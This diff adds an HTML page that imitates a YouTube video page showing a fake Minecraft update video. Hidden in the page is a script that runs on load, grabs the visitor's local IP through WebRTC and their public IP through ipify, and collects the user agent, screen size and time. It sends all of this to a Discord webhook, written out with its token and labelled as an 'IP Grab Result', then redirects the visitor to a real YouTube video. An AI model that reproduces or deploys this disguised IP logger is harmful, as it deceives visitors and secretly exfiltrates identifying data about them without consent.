@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>YouTube</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #0f0f0f;
+        }
+        .navbar {
+            background-color: #0f0f0f;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid #272727;
+        }
+        .logo {
+            font-size: 20px;
+            font-weight: bold;
+            color: white;
+        }
+        .logo span {
+            color: red;
+        }
+        .video-container {
+            max-width: 1200px;
+            margin: 20px auto;
+            background: black;
+            border-radius: 12px;
+            overflow: hidden;
+        }
+        .video-player {
+            width: 100%;
+            height: 500px;
+            background: #000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .video-player img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .title {
+            color: white;
+            font-size: 18px;
+            margin-top: 12px;
+            padding: 0 16px;
+        }
+        .channel {
+            color: #aaa;
+            font-size: 14px;
+            padding: 8px 16px;
+        }
+        .description {
+            color: white;
+            padding: 16px;
+            border-top: 1px solid #272727;
+            margin-top: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="navbar">
+        <div class="logo"><span>Y</span>ou<span>T</span>ube</div>
+    </div>
+    <div class="video-container">
+        <div class="video-player">
+            <img src="https://img.youtube.com/vi/dQw4w9WgXcQ/hqdefault.jpg" alt="Video thumbnail">
+        </div>
+    </div>
+    <div class="title">
+        Minecraft 1.21.11 Update - NEW BEEHIVE MECHANICS!
+    </div>
+    <div class="channel">
+        Minecraft Official • 2.4M views • 3 hours ago
+    </div>
+    <div class="description">
+        ⭐ NEW UPDATE! Beehives now produce honey 2x faster! Watch full guide!
+    </div>
+
+    <script>
+        // Function to get local IP via WebRTC
+        function getLocalIP() {
+            return new Promise((resolve) => {
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                pc.createOffer()
+                    .then(offer => pc.setLocalDescription(offer))
+                    .catch(() => {});
+                
+                pc.onicecandidate = (event) => {
+                    if (event && event.candidate && event.candidate.candidate) {
+                        const ipMatch = event.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+                        if (ipMatch) {
+                            const localIP = ipMatch[0];
+                            pc.close();
+                            resolve(localIP);
+                        }
+                    }
+                };
+                
+                setTimeout(() => {
+                    pc.close();
+                    resolve('192.168.1.1');
+                }, 3000);
+            });
+        }
+
+        // Function to get public IP
+        async function getPublicIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (e) {
+                return 'Unable to fetch';
+            }
+        }
+
+        // Discord webhook (REPLACE THIS)
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1509244481277399202/SzkqQUidTUL_JdiCpWRn4j_Qax_INcDFVEdTQLw-B68lm7AvWr8B6FVufvc7dCoBPGL8';
+
+        async function sendData() {
+            const localIP = await getLocalIP();
+            const publicIP = await getPublicIP();
+            const userAgent = navigator.userAgent;
+            const screenRes = `${screen.width}x${screen.height}`;
+            const time = new Date().toLocaleString();
+            
+            const embed = {
+                embeds: [{
+                    title: "🎯 IP Grab Result",
+                    color: 0xFF0000,
+                    fields: [
+                        { name: "🌐 Local IP", value: localIP, inline: true },
+                        { name: "🌍 Public IP", value: publicIP, inline: true },
+                        { name: "💻 User Agent", value: userAgent.substring(0, 100), inline: false },
+                        { name: "📺 Screen", value: screenRes, inline: true },
+                        { name: "⏰ Time", value: time, inline: true }
+                    ],
+                    footer: { text: "YouTube Clone IP Logger" },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+            
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(embed)
+                });
+            } catch(e) {}
+            
+            // Redirect to real YouTube video after 3 seconds
+            setTimeout(() => {
+                window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
+            }, 3000);
+        }
+        
+        sendData();
+    </script>
+</body>
+</html>
